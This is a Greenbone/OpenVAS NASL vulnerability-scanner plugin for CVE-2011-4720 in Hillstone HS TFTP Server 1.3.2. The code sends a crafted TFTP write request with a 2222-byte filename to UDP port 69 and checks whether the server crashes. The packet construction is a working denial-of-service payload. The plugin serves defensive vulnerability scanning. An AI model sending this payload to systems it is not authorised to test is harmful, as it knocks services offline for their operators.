# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802406");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2011-4720");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-12-05 15:58:57 +0530 (Mon, 05 Dec 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Hillstone Software TFTP Write/Read Request Server Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=419");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50886");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107468/hillstone-dos.txt");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Hillstone_Software_HS_TFTP_Server_DoS.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash the server
  process, resulting in a denial-of-service condition.");

  script_tag(name:"affected", value:"Hillstone Software HS TFTP version 1.3.2.");

  script_tag(name:"insight", value:"The flaw is caused by an error when processing TFTP write and
  read requests, which can be exploited to crash the server via a specially crafted request sent to UDP port 69.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Hillstone Software TFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if( ! tftp_alive( port:port ) )
  exit( 0 );

sock = open_sock_udp( port );
if( ! sock )
  exit( 0 );

crash = raw_string(0x00,0x02) + string(crap(data: raw_string(0x90),
        length: 2222)) + "binary" + raw_string(0x00);

send( socket:sock, data:crash );
close( sock );

if( ! tftp_alive( port:port ) ) {
  security_message( port:port, proto:"udp" );
  exit( 0 );
}

exit( 99 );
